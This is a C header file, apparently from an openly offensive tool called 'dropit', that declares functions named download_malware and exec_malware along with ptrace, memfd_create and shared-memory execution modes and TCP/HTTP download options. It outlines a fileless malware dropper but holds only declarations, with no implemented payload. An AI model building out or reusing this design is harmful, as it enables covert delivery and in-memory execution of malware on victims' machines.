#ifndef DROPIT_H
# define DROPIT_H

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <linux/memfd.h>
#include <getopt.h>

#define NR_memfd_create         319

# define GREEN "\033[0;32m"
# define RED "\033[0;31m"
# define WHITE "\033[0;0m"

typedef struct user_regs_struct t_regs;
typedef struct sockaddr_in      t_sockaddr_in;
typedef struct sockaddr         t_sockaddr;
typedef struct addrinfo         t_addrinfo;
typedef unsigned char           byte;

typedef enum                    e_protocol
{
    PROTO_TCP,
    PROTO_HTTP,
    PROTO_UNKNOWN
}                               t_protocol;

typedef enum                    e_exec_method
{
    EXEC_VE,
    EXEC_PTRACE,
    EXEC_SHARED,
    EXEC_UNKNOWN,
}                               t_exec_method;

typedef struct                  s_config
{
    t_addrinfo      *host_infos;
    char            *remote_file_name;
    t_protocol      protocol;
    t_exec_method   exec_method;
}                               t_config;

int                             parse_opt(int ac, char **av, t_config *config);
int                             download_malware(t_config config);
void                            exec_malware(t_config config, int memfd);


#endif